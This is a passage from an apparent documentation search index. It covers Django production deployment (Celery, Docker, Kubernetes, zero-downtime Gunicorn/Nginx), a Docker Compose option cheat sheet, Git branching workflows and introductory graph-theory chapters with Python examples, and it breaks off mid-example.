</ul>"},{"location":"django/django/#e-asynchronous-task-processing","title":"e. Asynchronous Task Processing","text":"<ul> <li>Use Celery:</li> <li>Offload long-running tasks to Celery workers to prevent blocking the main application.</li> </ul> <p>Celery Configuration: <pre><code># myproject/celery.py\nimport os\nfrom celery import Celery\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'myproject.settings')\n\napp = Celery('myproject')\napp.config_from_object('django.conf:settings', namespace='CELERY')\napp.autodiscover_tasks()\n</code></pre></p> <p>Define a Task: <pre><code># myapp/tasks.py\nfrom celery import shared_task\nfrom django.core.mail import send_mail\nfrom django.conf import settings\n\n@shared_task\ndef send_welcome_email(user_id):\n    from django.contrib.auth.models import User\n    user = User.objects.get(id=user_id)\n    send_mail(\n        'Welcome!',\n        f'Hi {user.username}, thank you for registering.',\n        settings.DEFAULT_FROM_EMAIL,\n        [user.email],\n    )\n</code></pre></p> <p>Triggering the Task: <pre><code># myapp/signals.py\nfrom django.db.models.signals import post_save\nfrom django.dispatch import receiver\nfrom django.contrib.auth.models import User\nfrom .tasks import send_welcome_email\n\n@receiver(post_save, sender=User)\ndef send_welcome_email_signal(sender, instance, created, **kwargs):\n    if created:\n        send_welcome_email.delay(instance.id)\n</code></pre></p>"},{"location":"django/django/#f-monitoring-and-logging","title":"f. Monitoring and Logging","text":"<ul> <li>Implement Monitoring Tools:</li> <li> <p>Use tools like Prometheus, Grafana, New Relic, or Datadog to monitor application performance and server health.</p> </li> <li> <p>Centralized Logging:</p> </li> <li>Aggregate logs using tools like ELK Stack (Elasticsearch, Logstash, Kibana) or Graylog for easier analysis and troubleshooting.</li> </ul>"},{"location":"django/django/#g-containerization-and-orchestration","title":"g. Containerization and Orchestration","text":"<ul> <li>Use Docker:</li> <li>Containerize the Django application for consistent deployments across environments.</li> </ul> <p>Example Dockerfile: <pre><code>FROM python:3.9-slim\n\nENV PYTHONUNBUFFERED=1\n\nWORKDIR /code\n\nCOPY requirements.txt /code/\nRUN pip install --upgrade pip &amp;&amp; pip install -r requirements.txt\n\nCOPY . /code/\n\nCMD [\"gunicorn\", \"myproject.wsgi:application\", \"--bind\", \"0.0.0.0:8000\"]\n</code></pre></p> <ul> <li>Orchestrate with Kubernetes:</li> <li>Manage containerized applications at scale, handling deployment, scaling, and management.</li> </ul> <p>Example Kubernetes Deployment: <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: django-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: django\n  template:\n    metadata:\n      labels:\n        app: django\n    spec:\n      containers:\n      - name: django\n        image: mydockerhub/myproject:latest\n        ports:\n        - containerPort: 8000\n        env:\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: django-secrets\n              key: secret_key\n</code></pre></p>"},{"location":"django/django/#h-auto-scaling","title":"h. Auto-Scaling","text":"<ul> <li>Implement Auto-Scaling Policies:</li> <li>Use cloud provider features (e.g., AWS Auto Scaling Groups) to automatically adjust the number of server instances based on traffic.</li> </ul> <p>Example AWS Auto Scaling Group Configuration: - Launch Configuration: Define the instance type, AMI, and startup script. - Scaling Policies: Set rules based on CPU usage or request latency. - Monitoring: Integrate with CloudWatch for metrics.</p>"},{"location":"django/django/#4-best-practices_1","title":"4. Best Practices","text":"<ul> <li>Use Environment Variables for Configuration: Avoid hardcoding sensitive information. Use packages like <code>django-environ</code> to manage environment variables.</li> </ul> <p>Example: <pre><code># settings.py\nimport environ\n\nenv = environ.Env()\nenviron.Env.read_env()\n\nSECRET_KEY = env('DJANGO_SECRET_KEY')\nDEBUG = env.bool('DEBUG', default=False)\nDATABASES = {\n    'default': env.db(),\n}\n</code></pre></p> <ul> <li>Implement Security Best Practices: Regularly audit security settings, apply patches, and follow Django\u2019s security recommendations.</li> <li>Automate Deployments: Use CI/CD pipelines to automate testing and deployment, reducing human error and increasing deployment speed.</li> <li>Backup Strategies: Implement regular backups for databases and critical data, ensuring recoverability in case of failures.</li> <li>Documentation and Version Control: Maintain clear documentation and use version control systems (e.g., Git) to track changes and collaborate effectively.</li> <li>Zero-Downtime Deployments: Use techniques like blue-green deployments or rolling updates to deploy new versions without downtime.</li> </ul> <p>Example Zero-Downtime Deployment with Gunicorn and Nginx:</p> <ol> <li> <p>Start New Gunicorn Workers: <pre><code>gunicorn myproject.wsgi:application --bind 127.0.0.1:8001 &amp;\n</code></pre></p> </li> <li> <p>Update Nginx to Proxy to New Workers: <pre><code>upstream django_app {\n    server 127.0.0.1:8000;\n    server 127.0.0.1:8001;\n}\n\nserver {\n    # ... existing configuration ...\n    location / {\n        proxy_pass http://django_app;\n        # ... other proxy settings ...\n    }\n}\n</code></pre></p> </li> <li> <p>Reload Nginx: <pre><code>sudo systemctl reload nginx\n</code></pre></p> </li> <li> <p>Gracefully Stop Old Workers: <pre><code>pkill -f 'gunicorn.*8000'\n</code></pre></p> </li> </ol> <p>Conclusion: Deploying Django applications in production involves configuring WSGI/ASGI servers, reverse proxies, secure settings, and implementing robust scaling strategies. By following best practices and utilizing advanced deployment techniques, developers can ensure their Django applications are performant, secure, and scalable to handle increased traffic effectively.</p>"},{"location":"docker/docker-compose/","title":"Docker Compose","text":"<pre><code>version: '3.8' # Specify the Docker Compose file format version\n\nservices:\n  webapp:\n    image: nginx:latest | custom-image:tag # Docker image to use\n    build: # Options for building the image\n      context: ./webapp | ./alternative-path # Build context\n      dockerfile: Dockerfile | CustomDockerfile # Dockerfile to use\n    container_name: my-custom-webapp | another-name # Custom name for the container\n    command: [\"nginx\", \"-g\", \"daemon off;\"] | [\"custom\", \"command\"] # Command to run in the container\n    entrypoint: [\"/entrypoint.sh\"] | [\"/alternative.sh\"] # Entrypoint for the container\n    ports: # Ports to expose\n      - \"8080:80\" # Map host port 8080 to container port 80\n      - \"8443:443\" # Map host port 8443 to container port 443\n    expose: # Expose ports without publishing them to the host machine\n      - \"8081\" # Expose port 8081\n    volumes: # Mount volumes\n      - type: bind | volume\n        source: ./app | named-volume\n        target: /app | /alternative-path\n    environment: # Environment variables\n      - ENV_VAR=example | another_variable=value\n    env_file: # Environment file\n      - .env | another.env\n    networks: # Networks to connect to\n      mynetwork | another-network:\n        aliases: # Network aliases\n          - webapp-alias | alternative-alias\n    depends_on: # Specify dependencies\n      database | another-service:\n        condition: service_started | service_healthy\n    stop_grace_period: 30s | 1m # Grace period before stopping the container\n    restart: on-failure | always | no # Restart policy\n    labels: # Labels for the container\n      com.example.label: example | another.label:value\n    logging: # Logging configuration\n      driver: \"json-file\" | \"syslog\" | \"fluentd\" # Logging driver\n      options:\n        max-size: \"10m\" | \"5m\"\n        max-file: \"3\" | \"5\"\n    tmpfs: # Temporary filesystems\n      - /tmp | /another-tmp\n    devices: # Devices to add to the container\n      - \"/dev/sda:/dev/sda\" | \"/dev/sdb:/dev/sdb\"\n    ulimits: # Ulimit options\n      nproc: 65535 | 10000\n      nofile:\n        soft: 4096 | 1024\n        hard: 8192 | 2048\n    cap_add: # Capabilities to add\n      - NET_ADMIN | AUDIT_CONTROL\n    cap_drop: # Capabilities to drop\n      - SYS_ADMIN | NET_RAW\n    security_opt: # Security options\n      - seccomp=unconfined | no-new-privileges\n    network_mode: bridge | host | none # Network mode\n    pid: \"host\" | \"container:name\" # PID namespace to use\n    cpu_shares: 256 | 512 # CPU shares (relative weight)\n    cpu_quota: 50000 | 100000 # CPU CFS quota\n    mem_limit: \"256m\" | \"512m\" # Memory limit\n    mem_reservation: \"128m\" | \"256m\" # Memory soft limit\n    tty: true | false # Allocate a pseudo-TTY\n    privileged: true | false # Extended privileges\n    init: true | false # Use an init process\n    cgroup_parent: my-cgroup | another-cgroup # Parent cgroup\n    shm_size: \"64m\" | \"128m\" # Size of /dev/shm\n    stop_signal: SIGTERM | SIGKILL # Signal to stop the container\n    sysctls: # Kernel parameters\n      - net.core.somaxconn=1024 | net.ipv4.tcp_tw_reuse=1\n      - net.ipv4.tcp_syncookies=0 | net.ipv6.conf.all.disable_ipv6=1\n    isolation: default | process | hyperv # Container isolation level\n    dns: # Custom DNS servers\n      - 8.8.8.8 | 1.1.1.1\n      - 8.8.4.4 | 9.9.9.9\n    dns_search: # DNS search domains\n      - example.com | another-domain.com\n    healthcheck: # Healthcheck configuration\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost\"] | [\"CMD-SHELL\", \"echo 'healthcheck'\"]\n      interval: 10s | 1m # Interval for running the healthcheck\n      timeout: 5s | 10s # Timeout for the healthcheck\n      retries: 3 | 5 # Number of retries for the healthcheck\n    extra_hosts: # Additional hosts\n      - \"otherhost:192.168.1.100\" | \"anotherhost:192.168.1.101\"\n    hostname: my-custom-hostname | alternative-hostname # Hostname of the container\n    domainname: example.com | another-domain.com # Domain name of the container\n    working_dir: /app | /another-directory # Working directory inside the container\n    read_only: true | false # Mount the container's root filesystem as read only\n    user: \"1000:1000\" | \"2000:2000\" # UID:GID to use when running the image\n    secrets: # Secrets to expose to the service\n      - my-secret | another-secret\n    configs: # Configs to expose to the service\n      - my-config | another-config\n    networks:\n    mynetwork | another-network:\n    driver: bridge | overlay # Network driver\n    ipam: # IP Address Management\n    driver: default | custom-driver\n    config:\n    - subnet: \"172.16.238.0/24\" | \"10.0.0.0/16\"\n    external: true | false # Use an external network\n\n    volumes:\n      my_volume | another_volume:\n        driver: local | custom-driver  # Volume driver\n        driver_opts:\n          type: none | btrfs\n          o: bind | nfs\n          device: /path/to/my/data | /another/path\n\n    secrets:\n      my-secret | another-secret:\n        file: ./secrets/my-secret.txt | ./another-secret.txt  # File to use for the secret\n        external: false | true  # Whether the secret is external\n\n    configs:\n      my-config | another-config:\n        file: ./configs/my-config.txt | ./another-config.txt  # File to use for the config\n        external: true | false  # Whether the config is external\n</code></pre>"},{"location":"git/flows/","title":"Workflows","text":""},{"location":"git/flows/#git-flow","title":"Git Flow","text":"<p>Git Flow is a branching model for Git, designed around project releases. It encompasses a strict branching model, designed for managing larger projects.</p> <p>Main Components: - Master branch: Always reflects a production-ready state. - Develop branch: Serves as an integration branch for features. - Feature branches: Branch off from develop and merge back into develop. - Release branches: Branch off from develop and merge into develop and master. - Hotfix branches: Branch off from master and merge into develop and master.</p> <p>Example Workflow: 1. Start a new feature:    <pre><code>git checkout -b feature/your_feature develop\n</code></pre> 2. Finish the feature and merge it into develop:    <pre><code>git checkout develop\ngit merge --no-ff feature/your_feature\ngit branch -d feature/your_feature\n</code></pre> 3. Preparing a release:    <pre><code>git checkout -b release/1.0.0 develop\n</code></pre> Test and finalize the release. 4. Complete the release:    <pre><code>git checkout master\ngit merge --no-ff release/1.0.0\ngit tag -a 1.0.0\ngit checkout develop\ngit merge --no-ff release/1.0.0\ngit branch -d release/1.0.0\n</code></pre> 5. Hotfixes:    <pre><code>git checkout -b hotfix/1.0.1 master\n</code></pre> After fixing: <pre><code>git checkout master\ngit merge --no-ff hotfix/1.0.1\ngit tag -a 1.0.1\ngit checkout develop\ngit merge --no-ff hotfix/1.0.1\ngit branch -d hotfix/1.0.1\n</code></pre></p>"},{"location":"git/flows/#github-flow","title":"GitHub Flow","text":"<p>GitHub Flow is a lightweight, branch-based workflow that supports teams and projects where deployments are made regularly.</p> <p>Main Components: - Main branch: Production-ready state at all times. - Feature branches: Branch off from main and should be deployed to production once their PRs are merged.</p> <p>Example Workflow: 1. Create a branch:    <pre><code>git checkout -b your_feature\n</code></pre> 2. Add commits and push your branch:    <pre><code>git push -u origin your_feature\n</code></pre> 3. Open a Pull Request (PR) for discussion and review. 4. Deploy from the branch to verify in production. 5. Merge into the main branch.</p>"},{"location":"git/flows/#trunk-based-development","title":"Trunk-Based Development","text":"<p>Trunk-Based Development is a version control strategy where developers collaborate on code in a single branch called \"trunk\", minimizing the existence of long-lived branches.</p> <p>Main Components: - Trunk/Main branch: Single source of truth for the current state of the project. - Short-lived feature branches: Typically exist for less than a day before merged into trunk. - Optional release branches: For teams releasing less frequently.</p> <p>Example Workflow: 1. Developers create short-lived feature branches off the trunk:    <pre><code>git checkout -b feature/quick_fix\n</code></pre> 2. After testing, the feature is merged back into the trunk:    <pre><code>git checkout trunk\ngit merge --no-ff feature/quick_fix\ngit branch -d feature/quick_fix\n</code></pre> 3. Regularly push the trunk changes to the central repository.</p> <p>In Trunk-Based Development, the focus is on keeping the branches short-lived to encourage continuous integration and minimize merge conflicts.</p>"},{"location":"graph/graph/","title":"Chapter 1: Introduction to Graph Theory","text":""},{"location":"graph/graph/#what-is-graph-theory","title":"What is Graph Theory?","text":"<p>Graph theory is a branch of mathematics that studies the relationships between objects. These relationships are represented as graphs, which consist of two main components: - Vertices (nodes): Represent the objects. - Edges (links): Represent the relationships between the objects.</p> <p>In Python, graphs can be modeled using various data structures, such as dictionaries, lists, or specialized libraries like NetworkX.</p>"},{"location":"graph/graph/#example-simple-graph-representation","title":"Example: Simple Graph Representation","text":"<p>Below is an example of how to represent a graph in Python using a dictionary:</p> <pre><code># Graph represented as an adjacency list\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\n# Printing the neighbors of each vertex\nfor vertex, neighbors in graph.items():\n    print(f\"Vertex {vertex}: {neighbors}\")\n</code></pre> <p>Output: <pre><code>Vertex A: ['B', 'C']\nVertex B: ['A', 'D']\nVertex C: ['A', 'D']\nVertex D: ['B', 'C']\n</code></pre></p> <p>This is a simple example of an undirected graph, where edges have no direction.</p>"},{"location":"graph/graph/#historical-background","title":"Historical Background","text":"<p>The origins of graph theory can be traced back to the famous Seven Bridges of K\u00f6nigsberg problem, solved by Leonhard Euler in 1736. This work laid the foundation for graph theory as a mathematical discipline.</p>"},{"location":"graph/graph/#the-problem","title":"The Problem","text":"<p>The city of K\u00f6nigsberg (modern-day Kaliningrad) had seven bridges connecting its landmasses. The challenge was to find a walk that would cross each bridge exactly once. Euler proved that such a walk was impossible, introducing the concept of Eulerian paths.</p>"},{"location":"graph/graph/#eulerian-path-example-in-python","title":"Eulerian Path Example in Python","text":"<pre><code># Function to check for an Eulerian path\ndef is_eulerian_path(graph):\n    odd_degree_count = sum(1 for node in graph if len(graph[node]) % 2 != 0)\n    return odd_degree_count in [0, 2]\n\n# Example graph (adjacency list)\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'C'],\n    'C': ['A', 'B', 'D'],\n    'D': ['C']\n}\n\nprint(\"Has Eulerian Path:\" , is_eulerian_path(graph))  # Output: True\n</code></pre>"},{"location":"graph/graph/#applications-of-graph-theory","title":"Applications of Graph Theory","text":"<p>Graph theory has numerous real-world applications across various fields:</p> <ol> <li>Social Networks: Representing friendships or connections.</li> <li>Example: Facebook uses graphs where nodes are users, and edges are friendships.</li> <li>Transportation Networks: Modeling roads, railways, or airline routes.</li> <li>Computer Science: Optimizing tasks such as routing, searching, and scheduling.</li> <li>Biology: Analyzing networks like food webs or protein interactions.</li> </ol> <p>These applications demonstrate the versatility and importance of graph theory in solving practical problems.</p>"},{"location":"graph/graph/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Graphs are powerful tools for modeling relationships between entities.</li> <li>Euler's foundational work introduced the idea of paths and cycles in graphs.</li> <li>Python provides flexible tools for graph representation and analysis.</li> </ul> <p>Next, we will delve deeper into the fundamentals of graphs, including terminology, types of graphs, and their representations.</p>"},{"location":"graph/graph/#chapter-2-fundamentals-of-graphs","title":"Chapter 2: Fundamentals of Graphs","text":""},{"location":"graph/graph/#definitions-and-terminology","title":"Definitions and Terminology","text":"<p>Before diving into graph theory, it's essential to understand the basic terms and concepts:</p> <ol> <li>Graph (G): A set of vertices ( V ) and edges ( E ), represented as ( G = (V, E) ).</li> <li>Vertex (Node): A fundamental unit of a graph, typically denoted as ( V = {v_1, v_2, \\dots, v_n} ).</li> <li>Edge: A connection between two vertices, represented as ( E = {e_1, e_2, \\dots, e_m} ).</li> <li>Degree: The number of edges connected to a vertex.  </li> <li>In-degree: Number of incoming edges (in directed graphs).</li> <li>Out-degree: Number of outgoing edges (in directed graphs).</li> </ol>"},{"location":"graph/graph/#example-graph-terminology","title":"Example: Graph Terminology","text":"<pre><code># Example graph as an adjacency list\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\n# Function to calculate the degree of each vertex\ndef calculate_degrees(graph):\n    degrees = {vertex: len(neighbors) for vertex, neighbors in graph.items()}\n    return degrees\n\nprint(\"Degrees of vertices:\", calculate_degrees(graph))\n</code></pre> <p>Output: <pre><code>Degrees of vertices: {'A': 2, 'B': 2, 'C': 2, 'D': 2}\n</code></pre></p>"},{"location":"graph/graph/#types-of-graphs","title":"Types of Graphs","text":"<p>Graphs can be classified into several categories based on their properties:</p>"},{"location":"graph/graph/#1-directed-and-undirected-graphs","title":"1. Directed and Undirected Graphs","text":"<ul> <li>Undirected Graph: Edges have no direction (e.g., ( A \\leftrightarrow B )).</li> <li>Directed Graph (Digraph): Edges have a direction (e.g., ( A \\rightarrow B )).</li> </ul>"},{"location":"graph/graph/#python-example-directed-vs-undirected-graphs","title":"Python Example: Directed vs. Undirected Graphs","text":"<pre><code># Undirected graph\nundirected_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\n# Directed graph\ndirected_graph = {\n    'A': ['B', 'C'],\n    'B': ['D'],\n    'C': [],\n    'D': ['C']\n}\n\nprint(\"Undirected Graph:\", undirected_graph)\nprint(\"Directed Graph:\", directed_graph)\n</code></pre>"},{"location":"graph/graph/#2-weighted-and-unweighted-graphs","title":"2. Weighted and Unweighted Graphs","text":"<ul> <li>Unweighted Graph: All edges are equal.</li> <li>Weighted Graph: Edges have weights representing costs, distances, or capacities.</li> </ul>"},{"location":"graph/graph/#python-example-weighted-graph","title":"Python Example: Weighted Graph","text":"<pre><code># Weighted graph represented as a dictionary\nweighted_graph = {\n    'A': {'B': 3, 'C': 5},\n    'B': {'A': 3, 'D': 4},\n    'C': {'A': 5, 'D': 2},\n    'D': {'B': 4, 'C': 2}\n}\n\n# Function to print weights of edges\nfor node, edges in weighted_graph.items():\n    for neighbor, weight in edges.items():\n        print(f\"Edge {node} -&gt; {neighbor}, Weight: {weight}\")\n</code></pre> <p>Output: <pre><code>Edge A -&gt; B, Weight: 3\nEdge A -&gt; C, Weight: 5\nEdge B -&gt; A, Weight: 3\nEdge B -&gt; D, Weight: 4\nEdge C -&gt; A, Weight: 5\nEdge C -&gt; D, Weight: 2\nEdge D -&gt; B, Weight: 4\nEdge D -&gt; C, Weight: 2\n</code></pre></p>"},{"location":"graph/graph/#3-simple-graphs-and-multigraphs","title":"3. Simple Graphs and Multigraphs","text":"<ul> <li>Simple Graph: A graph without loops or multiple edges between vertices.</li> <li>Multigraph: A graph that allows multiple edges between the same pair of vertices.</li> </ul>"},{"location":"graph/graph/#representations-of-graphs","title":"Representations of Graphs","text":"<p>Graphs can be represented in various ways, depending on the application:</p>"},{"location":"graph/graph/#1-adjacency-matrix","title":"1. Adjacency Matrix","text":"<p>An ( n \\times n ) matrix where ( A[i][j] = 1 ) if there is an edge from vertex ( i ) to ( j ), otherwise ( 0 ).</p>"},{"location":"graph/graph/#python-example-adjacency-matrix","title":"Python Example: Adjacency Matrix","text":"<pre><code># Example graph\nadj_matrix = [\n    [0, 1, 1, 0],\n    [1, 0, 0, 1],\n    [1, 0, 0, 1],\n    [0, 1, 1, 0]\n]\n\n# Display the adjacency matrix\nfor row in adj_matrix:\n    print(row)\n</code></pre> <p>Output: <pre><code>[0, 1, 1, 0]\n[1, 0, 0, 1]\n[1, 0, 0, 1]\n[0, 1, 1, 0]\n</code></pre></p>"},{"location":"graph/graph/#2-adjacency-list","title":"2. Adjacency List","text":"<p>A list where each vertex stores its neighbors. This is space-efficient for sparse graphs.</p>"},{"location":"graph/graph/#python-example-adjacency-list","title":"Python Example: Adjacency List","text":"<pre><code># Graph represented as an adjacency list\nadj_list = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\n# Display the adjacency list\nfor vertex, neighbors in adj_list.items():\n    print(f\"{vertex}: {neighbors}\")\n</code></pre> <p>Output: <pre><code>A: ['B', 'C']\nB: ['A', 'D']\nC: ['A', 'D']\nD: ['B', 'C']\n</code></pre></p>"},{"location":"graph/graph/#3-incidence-matrix","title":"3. Incidence Matrix","text":"<p>An ( n \\times m ) matrix where rows represent vertices and columns represent edges. ( M[i][j] = 1 ) if vertex ( i ) is incident to edge ( j ).</p>"},{"location":"graph/graph/#key-takeaways_1","title":"Key Takeaways","text":"<ul> <li>Graphs can be directed, undirected, weighted, or unweighted.</li> <li>Representations include adjacency matrices, adjacency lists, and incidence matrices.</li> <li>Python provides flexible tools for implementing and exploring these concepts.</li> </ul> <p>Next, we will explore graph properties, including connectedness, paths, cycles, and subgraphs.</p>"},{"location":"graph/graph/#chapter-3-graph-properties","title":"Chapter 3: Graph Properties","text":""},{"location":"graph/graph/#degree-of-a-vertex","title":"Degree of a Vertex","text":"<p>The degree of a vertex is the number of edges connected to it.</p> <ul> <li>Undirected Graph: The degree is simply the count of edges connected to the vertex.  </li> <li>Directed Graph: </li> <li>In-degree: Number of edges coming into the vertex.  </li> <li>Out-degree: Number of edges going out from the vertex.</li> </ul>"},{"location":"graph/graph/#example-degree-calculation","title":"Example: Degree Calculation","text":"<pre><code># Function to calculate degrees in an undirected graph\ndef calculate_degrees(graph):\n    return {vertex: len(neighbors) for vertex, neighbors in graph.items()}\n\n# Example undirected graph\nundirected_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\nprint(\"Degrees:\", calculate_degrees(undirected_graph))\n\n# Function to calculate in-degree and out-degree in a directed graph\ndef calculate_in_out_degrees(directed_graph):\n    in_degrees = {vertex: 0 for vertex in directed_graph}\n    out_degrees = {vertex: len(neighbors) for vertex, neighbors in directed_graph.items()}\n\n    for vertex, neighbors in directed_graph.items():\n        for neighbor in neighbors:\n            in_degrees[neighbor] += 1\n\n    return in_degrees, out_degrees\n\n# Example directed graph\ndirected_graph = {\n    'A': ['B', 'C'],\n    'B': ['D'],\n    'C': [],\n    'D': ['C']\n}\n\nin_deg, out_deg = calculate_in_out_degrees(directed_graph)\nprint(\"In-degrees:\", in_deg)\nprint(\"Out-degrees:\", out_deg)\n</code></pre> <p>Output: <pre><code>Degrees: {'A': 2, 'B': 2, 'C': 2, 'D': 2}\nIn-degrees: {'A': 0, 'B': 1, 'C': 2, 'D': 1}\nOut-degrees: {'A': 2, 'B': 1, 'C': 0, 'D': 1}\n</code></pre></p>"},{"location":"graph/graph/#connectedness","title":"Connectedness","text":"<p>A graph is connected if there is a path between every pair of vertices.</p> <ol> <li>Connected Graph: All vertices are reachable from any vertex.</li> <li>Disconnected Graph: Contains at least two subsets of vertices with no paths between them.</li> <li>Strongly Connected (Directed Graphs): Every vertex is reachable from every other vertex following the edge directions.</li> </ol>"},{"location":"graph/graph/#example-check-connectedness","title":"Example: Check Connectedness","text":"<pre><code># Function to check if a graph is connected\ndef is_connected(graph):\n    visited = set()\n\n    def dfs(node):\n        if node not in visited:\n            visited.add(node)\n            for neighbor in graph[node]:\n                dfs(neighbor)\n\n    start_vertex = next(iter(graph))\n    dfs(start_vertex)\n\n    return len(visited) == len(graph)\n\n# Example graphs\nconnected_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\ndisconnected_graph = {\n    'A': ['B'],\n    'B': ['A'],\n    'C': ['D'],\n    'D': ['C']\n}\n\nprint(\"Connected Graph:\", is_connected(connected_graph))  # True\nprint(\"Disconnected Graph:\", is_connected(disconnected_graph))  # False\n</code></pre>"},{"location":"graph/graph/#paths-and-cycles","title":"Paths and Cycles","text":"<ul> <li>Path: A sequence of edges connecting a sequence of vertices.  </li> <li>Simple Path: No vertex is repeated.  </li> <li>Cycle: A path that starts and ends at the same vertex.  </li> <li>Simple Cycle: No other vertex is repeated except the starting/ending vertex.</li> </ul>"},{"location":"graph/graph/#example-find-all-paths","title":"Example: Find All Paths","text":"<pre><code># Function to find all paths between two vertices\ndef find_all_paths(graph, start, end, path=[]):\n    path = path + [start]\n    if start == end:\n        return [path]\n    if start not in graph:\n        return []\n\n    paths = []\n    for neighbor in graph[start]:\n        if neighbor not in path:\n            new_paths = find_all_paths(graph, neighbor, end, path)\n            paths.extend(new_paths)\n    return paths\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\nprint(\"Paths from A to D:\", find_all_paths(graph, 'A', 'D'))\n</code></pre> <p>Output: <pre><code>Paths from A to D: [['A', 'B', 'D'], ['A', 'C', 'D']]\n</code></pre></p>"},{"location":"graph/graph/#bipartite-graphs","title":"Bipartite Graphs","text":"<p>A bipartite graph is a graph whose vertices can be divided into two disjoint sets ( U ) and ( V ) such that every edge connects a vertex in ( U ) to one in ( V ).</p>"},{"location":"graph/graph/#example-check-if-a-graph-is-bipartite","title":"Example: Check if a Graph is Bipartite","text":"<pre><code># Function to check if a graph is bipartite\ndef is_bipartite(graph):\n    color = {}\n    queue = []\n\n    start_vertex = next(iter(graph))\n    queue.append(start_vertex)\n    color[start_vertex] = 0\n\n    while queue:\n        vertex = queue.pop(0)\n        for neighbor in graph[vertex]:\n            if neighbor not in color:\n                color[neighbor] = 1 - color[vertex]\n                queue.append(neighbor)\n            elif color[neighbor] == color[vertex]:\n                return False\n    return True\n\n# Example graphs\nbipartite_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\nnon_bipartite_graph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'C'],\n    'C': ['A', 'B']\n}\n\nprint(\"Is Bipartite:\", is_bipartite(bipartite_graph))  # True\nprint(\"Is Bipartite:\", is_bipartite(non_bipartite_graph))  # False\n</code></pre>"},{"location":"graph/graph/#subgraphs","title":"Subgraphs","text":"<p>A subgraph is a graph formed from a subset of the vertices and edges of another graph.</p>"},{"location":"graph/graph/#example-extract-subgraph","title":"Example: Extract Subgraph","text":"<pre><code># Function to extract a subgraph\ndef extract_subgraph(graph, vertices):\n    subgraph = {v: [n for n in neighbors if n in vertices] for v, neighbors in graph.items() if v in vertices}\n    return subgraph\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['A', 'D'],\n    'C': ['A', 'D'],\n    'D': ['B', 'C']\n}\n\n# Extract subgraph containing vertices A, B, and C\nsubgraph = extract_subgraph(graph, ['A', 'B', 'C'])\nprint(\"Subgraph:\", subgraph)\n</code></pre> <p>Output: <pre><code>Subgraph: {'A': ['B', 'C'], 'B': ['A'], 'C': ['A']}\n</code></pre></p>"},{"location":"graph/graph/#key-takeaways_2","title":"Key Takeaways","text":"<ul> <li>The degree of a vertex provides insights into its connectivity.</li> <li>Connectedness and cycles help in understanding the overall structure.</li> <li>Bipartite graphs and subgraphs are useful in specialized applications.</li> </ul> <p>Next, we will explore graph traversal algorithms, including Depth-First Search (DFS) and Breadth-First Search (BFS).</p> <p>Graph traversal is the process of visiting all the vertices of a graph in a systematic way. It is fundamental for exploring the structure of a graph, solving problems like searching, pathfinding, and connectivity.</p>"},{"location":"graph/graph/#depth-first-search-dfs","title":"Depth-First Search (DFS)","text":"<p>DFS explores as far as possible along a branch before backtracking. It uses a stack (explicitly or implicitly via recursion).</p>"},{"location":"graph/graph/#steps-of-dfs","title":"Steps of DFS","text":"<ol> <li>Start at a vertex.</li> <li>Visit the vertex and mark it as visited.</li> <li>Recursively visit all unvisited neighbors.</li> <li>Backtrack when all neighbors are visited.</li> </ol>"},{"location":"graph/graph/#example-dfs-implementation","title":"Example: DFS Implementation","text":"<pre><code># Recursive DFS\ndef dfs_recursive(graph, start, visited=None):\n    if visited is None:\n        visited = set()\n    visited.add(start)\n    print(start, end=\" \")  # Process the node\n    for neighbor in graph[start]:\n        if neighbor not in visited:\n            dfs_recursive(graph, neighbor, visited)\n\n# Iterative DFS\ndef dfs_iterative(graph, start):\n    visited = set()\n    stack = [start]\n\n    while stack:\n        vertex = stack.pop()\n        if vertex not in visited:\n            visited.add(vertex)\n            print(vertex, end=\" \")  # Process the node\n            stack.extend(reversed(graph[vertex]))  # Reverse for consistent ordering\n\n# Example graph\ngraph = {\n    'A': ['B', 'C'],\n    'B': ['D', 'E'],\n    'C': ['F'],\n    'D': [],\n    'E': ['F'],\n    'F': []\n}\n\nprint(\"Recursive DFS:\")\ndfs_recursive(graph, 'A')\nprint(\"\\nIterative DFS:\")\ndfs_iterative(graph, 'A')\n</code></pre> <p>Output: <pre><code>Recursive DFS:\nA B D E F C\nIterative DFS:\nA B D E F C\n</code></pre></p>"},{"location":"graph/graph/#breadth-first-search-bfs","title":"Breadth-First Search (BFS)","text":"<p>BFS explores all neighbors of a vertex before moving to the next level. It uses a queue for tracking vertices.</p>"},{"location":"graph/graph/#steps-of-bfs","title":"Steps of BFS","text":"<ol> <li>Start at a vertex.</li> <li>Visit the vertex and mark it as visited.</li> <li>Enqueue all unvisited neighbors.</li> <li>Dequeue the next vertex and repeat until the queue is empty.</li> </ol>"},{"location":"graph/graph/#example-bfs-implementation","title":"Example: BFS Implementation","text":"<pre><code># BFS using a queue\nfrom collections import deque\n\ndef bfs(graph, start):\n    visited = set()\n    queue = deque([start])\n\n    while queue:\n        vertex = queue.popleft()\n        if vertex not in visited:\n            visited.add(vertex)\n            print(vertex, end=\" \")  # Process the node\n            queue.extend(graph[vertex])\n\n# 